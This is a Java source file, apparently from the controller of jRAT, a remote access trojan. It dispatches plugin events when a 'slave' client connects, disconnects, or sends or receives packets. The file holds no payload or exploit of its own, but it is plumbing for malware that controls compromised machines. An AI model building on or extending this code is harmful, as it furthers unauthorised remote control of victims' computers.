package se.jrat.controller.addons;

import jrat.api.Client;
import jrat.api.Packet;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnConnectEvent;
import jrat.api.events.OnDisconnectEvent;
import jrat.api.events.OnSendPacketEvent;
import jrat.api.net.PacketListener;
import se.jrat.controller.AbstractSlave;

public class PluginEventHandler {

	public static void onPacket(AbstractSlave slave, byte header) {				
		Client client = ClientFormat.format(slave);
		
		for (PacketListener l : Packet.getEvents(header)) {
			l.perform(client);
		}
	}

	public static void onConnect(AbstractSlave slave) {
		OnConnectEvent e = new OnConnectEvent(ClientFormat.format(slave));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_CONNECT)) {
			event.perform(e);
		}
	}

	public static void onDisconnect(AbstractSlave slave) {
		OnDisconnectEvent e = new OnDisconnectEvent(ClientFormat.format(slave));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_DISCONNECT)) {
			event.perform(e);
		}
	}

	public static void onSendPacket(byte header, AbstractSlave slave) {
		OnSendPacketEvent e = new OnSendPacketEvent(new Packet(header), ClientFormat.format(slave));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_SERVER_PACKET_SEND)) {
			event.perform(e);
		}
	}

}
